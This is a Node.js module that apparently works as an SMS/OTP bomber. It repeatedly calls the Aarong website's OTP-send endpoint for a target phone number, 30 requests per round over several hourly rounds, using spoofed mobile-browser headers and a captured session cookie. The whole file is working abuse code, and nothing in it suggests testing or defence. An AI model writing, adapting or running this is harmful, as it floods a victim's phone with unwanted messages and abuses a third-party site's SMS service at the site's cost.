const axios = require("axios");

async function aroong(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.get(`https://www.aarong.com/otpverify/account/sendotp/mobile_number/${number}/`, {
  headers: {
    'authority': 'www.aarong.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': '_fbp=fb.1.1750989370703.239574083274860176; _gcl_au=1.1.1040161298.1750989373; _ga=GA1.1.543691747.1750989373; form_key=4YVOqAYohDT1IEDq; user_allowed_save_cookie=%7B%221%22%3A1%7D; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; PHPSESSID=ae0044303d63d3614337ef2f1939f842; form_key=4YVOqAYohDT1IEDq; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; authentication_flag=false; private_content_version=63ef007a6d12825d385a2c3f7cd9e6a5; _ga_X56J4KRH5L=GS2.1.s1750997870$o2$g1$t1750998001$j54$l0$h0; mage-messages=; section_data_ids={%22customer%22:1750998007%2C%22compare-products%22:1750998007%2C%22last-ordered-items%22:1750998007%2C%22cart%22:1750998007%2C%22directory-data%22:1750998007%2C%22captcha%22:1750998007%2C%22wishlist%22:1750998007%2C%22instant-purchase%22:1750998007%2C%22loggedAsCustomer%22:1750998007%2C%22multiplewishlist%22:1750998007%2C%22persistent%22:1750998007%2C%22review%22:1750998007%2C%22bss-fbpixel-atc%22:1750998007%2C%22bss-fbpixel-subscribe%22:1750998007%2C%22recently_viewed_product%22:1750998007%2C%22recently_compared_product%22:1750998007%2C%22product_data_storage%22:1750998007%2C%22paypal-billing-agreement%22:1750998007%2C%22messages%22:1750998007}',
    'referer': 'https://www.aarong.com/customer/account/login/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
  }
});
        
        console.log(`[${i + 1}/10] aroong Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] aroong Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { aroong };
